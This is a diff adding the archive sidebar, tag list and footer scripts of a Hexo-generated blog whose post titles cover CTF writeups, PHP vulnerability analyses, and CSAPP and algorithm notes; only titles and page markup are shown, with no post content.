+        <li class="archive-post-item">
+            <span class="archive-post-date">11/21</span><a class="archive-post-title" href="/2019/11/21/ThinkCMF-前台模板注入-RCE/">ThinkCMF 前台模板注入 RCE</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/11</span><a class="archive-post-title" href="/2019/11/11/CSAPP-Chapter-9-Notes/">CSAPP 虚拟存储器 笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2019/10/28/CSAPP-Chapter-8-Notes/">CSAPP 异常控制流 笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/24</span><a class="archive-post-title" href="/2019/10/24/Python-pickle-反序列化实例分析/">Python pickle 反序列化实例分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/21</span><a class="archive-post-title" href="/2019/10/21/CSAPP-Chapter-6-Notes/">CSAPP 存储器层次结构 笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/10</span><a class="archive-post-title" href="/2019/10/10/CSAPP-Chapter-3-Notes/">CSAPP 程序的机器级表示 笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/06</span><a class="archive-post-title" href="/2019/10/06/BalsnCTF-2019-web题/">Balsn CTF 2019 web 题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/08</span><a class="archive-post-title" href="/2019/09/08/CSAPP-Chapter-2-Notes/">CSAPP 信息的表示和处理 笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/01</span><a class="archive-post-title" href="/2019/09/01/CSAPP-Chapter-1-Notes/">CSAPP 计算机系统漫游 笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/20</span><a class="archive-post-title" href="/2019/08/20/当PHP反序列化遇上SSRF/">当 PHP 反序列化遇上 SSRF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span><a class="archive-post-title" href="/2019/07/18/Discuz-ML!-V3.X-RCE/">Discuz ML! V3.X RCE</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/11</span><a class="archive-post-title" href="/2019/07/11/PHP-写入配置文件经典问题/">PHP 写入配置文件经典问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/18</span><a class="archive-post-title" href="/2019/05/18/phar-与反序列化学习/">phar 与反序列化学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/17</span><a class="archive-post-title" href="/2019/05/17/Redis-未授权访问相关利用/">Redis 未授权访问相关利用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/12</span><a class="archive-post-title" href="/2019/05/12/命令注入总结/">命令注入总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/07</span><a class="archive-post-title" href="/2019/04/07/vulnhub-靶机实战系列-HackInOS/">vulnhub 靶机实战系列 HackInOS</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/04</span><a class="archive-post-title" href="/2019/04/04/Leetcode-322-Coin-Change/">Leetcode 322.Coin Change[DP]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/02</span><a class="archive-post-title" href="/2019/04/02/无字母数字-webshell/">无字母数字 webshell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/02</span><a class="archive-post-title" href="/2019/03/02/PHP-SECURITY-CALENDAR-2017/">PHP SECURITY CALENDAR Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/sqlmap-tamper-列表/">sqlmap tamper 列表</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/26</span><a class="archive-post-title" href="/2019/02/26/Jarvis-OJ-inject/">Jarvis OJ inject</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/25</span><a class="archive-post-title" href="/2019/02/25/Jarvis-OJ-phpinfo/">Jarvis OJ phpinfo</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/02</span><a class="archive-post-title" href="/2019/02/02/Hackme-Writeup/">Hackme-Web-Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/02</span><a class="archive-post-title" href="/2019/02/02/Jarvis-OJ-Writeup/">Jarvis OJ Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/01</span><a class="archive-post-title" href="/2019/02/01/Prompt-1-xss-通关记录/">Prompt 1 to win 通关记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/2019-Fireshell-Web-Vice/">2019 fireshell web Vice</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/安恒杯-一月-Web/">安恒杯 一月 web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/02</span><a class="archive-post-title" href="/2019/01/02/POJ-2352-Stars-树状数组/">POJ 2352 Stars[树状数组]</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/30</span><a class="archive-post-title" href="/2018/12/30/Code-Breaking-Writeup/">Code Breaking Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/30</span><a class="archive-post-title" href="/2018/12/30/2017-NJCTF-Guess/">2017 NJCTF web guess</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/22</span><a class="archive-post-title" href="/2018/12/22/优雅实现哈夫曼编码/">优雅实现哈夫曼编码</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href="/2018/12/08/Please_don't_stop_rua_233333/">Please don't stop rua 233333</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/30</span><a class="archive-post-title" href="/2018/11/30/Docker-常用命令/">Docker-常用命令清单</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/23</span><a class="archive-post-title" href="/2018/11/23/漏洞练习平台及工具/">漏洞练习平台及工具</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href="/2018/11/02/Sqli-labs-通关记录/">Sqli-labs 通关笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-3984-迷宫问题-BFS/">POJ 3984 迷宫问题[BFS]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-1321-棋盘问题-DFS/">POJ 1321 棋盘问题[DFS]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/23</span><a class="archive-post-title" href="/2018/10/23/Raccoon-Writeup/">Raccoon web Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/02</span><a class="archive-post-title" href="/2018/10/02/学习一项技能要花多少时间/">学习一项技能要花多少时间？</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/26</span><a class="archive-post-title" href="/2018/09/26/Bugku-Web-Writeup/">Bugku Web 部分WP</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/28</span><a class="archive-post-title" href="/2018/07/28/ACM-常用Trick/">ACM 常用小 Trick</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/16</span><a class="archive-post-title" href="/2018/05/16/十年学会编程/">Teach Yourself Programming in Ten Years</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/25</span><a class="archive-post-title" href="/2018/01/25/Hello-World/">Hello World</a>
+        </li>
+    
+    </ul></div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="Writeup"><span class="iconfont-archer">&#xe606;</span>Writeup</span>
+    
+        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
+    
+        <span class="sidebar-tag-name" data-tags="读书笔记"><span class="iconfont-archer">&#xe606;</span>读书笔记</span>
+    
+        <span class="sidebar-tag-name" data-tags="php 伪随机数"><span class="iconfont-archer">&#xe606;</span>php 伪随机数</span>
+    
+        <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
+    
+        <span class="sidebar-tag-name" data-tags="Docker"><span class="iconfont-archer">&#xe606;</span>Docker</span>
+    
+        <span class="sidebar-tag-name" data-tags="反序列化"><span class="iconfont-archer">&#xe606;</span>反序列化</span>
+    
+        <span class="sidebar-tag-name" data-tags="SQLi"><span class="iconfont-archer">&#xe606;</span>SQLi</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞分析"><span class="iconfont-archer">&#xe606;</span>漏洞分析</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
+    
+        <span class="sidebar-tag-name" data-tags="php"><span class="iconfont-archer">&#xe606;</span>php</span>
+    
+        <span class="sidebar-tag-name" data-tags="ThinkPHP"><span class="iconfont-archer">&#xe606;</span>ThinkPHP</span>
+    
+        <span class="sidebar-tag-name" data-tags="smarty"><span class="iconfont-archer">&#xe606;</span>smarty</span>
+    
+        <span class="sidebar-tag-name" data-tags="webshell"><span class="iconfont-archer">&#xe606;</span>webshell</span>
+    
+        <span class="sidebar-tag-name" data-tags="命令注入"><span class="iconfont-archer">&#xe606;</span>命令注入</span>
+    
+        <span class="sidebar-tag-name" data-tags="心得"><span class="iconfont-archer">&#xe606;</span>心得</span>
+    
+        <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
+    
+        <span class="sidebar-tag-name" data-tags="redis"><span class="iconfont-archer">&#xe606;</span>redis</span>
+    
+        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
+    
+        <span class="sidebar-tag-name" data-tags="SSRF"><span class="iconfont-archer">&#xe606;</span>SSRF</span>
+    
+        <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="笔记"><span class="iconfont-archer">&#xe606;</span>笔记</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br>
+    1、请确保node版本大于6.2<br>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "wywwzjj"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
